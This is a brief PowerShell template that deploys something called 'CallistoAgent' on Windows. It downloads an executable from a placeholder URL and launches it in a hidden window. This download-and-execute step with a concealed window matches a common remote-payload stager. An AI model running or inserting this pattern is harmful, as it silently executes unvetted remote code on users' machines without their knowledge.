# CallistoAgent Windows Deployment Script
# Variables: {{AGENT_URL}}, {{AGENT_PATH}}

$agentUrl = "{{AGENT_URL}}"
$agentPath = "{{AGENT_PATH}}"

# Download agent
Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath -UseBasicParsing

# Execute agent (hidden window)
Start-Process -FilePath $agentPath -WindowStyle Hidden
